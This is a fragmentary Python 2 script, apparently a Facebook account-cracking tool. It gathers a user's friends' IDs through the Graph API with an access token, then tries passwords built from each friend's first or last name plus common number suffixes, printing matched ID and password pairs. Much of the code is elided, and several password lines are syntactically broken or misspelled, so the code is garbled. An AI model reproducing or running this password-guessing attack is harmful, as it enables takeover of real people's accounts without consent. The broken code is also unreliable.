...
def login():
    ...
    try:
        ...
        try:
            ...
            print '\n\x1b[1;91m[!] Error Internet Nhi Hega'
            keluar()
...
def menu():
    try:
        ...
        os.system('clear')
        print '\x1b[1;91m[!] Token Nhi Hegy'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            ...
            print logo
            print '\x1b[1;91m[!] Internet Nhı Hega'
            keluar()
...
def mini():
    ...
    try:
        ...
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] Target ID Mein friendz Hon!'
        try:
            ...
            if 'access_token' in y:
                ...
                if 'www.facebook.com' in y['error_msg']:
                    ...
                    pz2 = a['first_name'] + '12345',+'113',+'13',+'786',+'1122',+'11',+'13'
...
def scrak():
    ...
    try:
        ...
        print '\x1b[1;91m[\xe2\x9c\x96] InternetNhi Hega'
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mGetting IDz \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
    ...
    def main(arg):
        ...
        try:
                ...
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123',+'1122',+'113',+'13'
                ...
                if 'access_token' in q:
                    ...
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                            ...
                            pass2 = b['firs_name'] + '12345',+'786',+'555',+'12',+'22'
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                                        ...
                                        pass3 = b['last_name'] + '123',+'22',+'13',+'113'
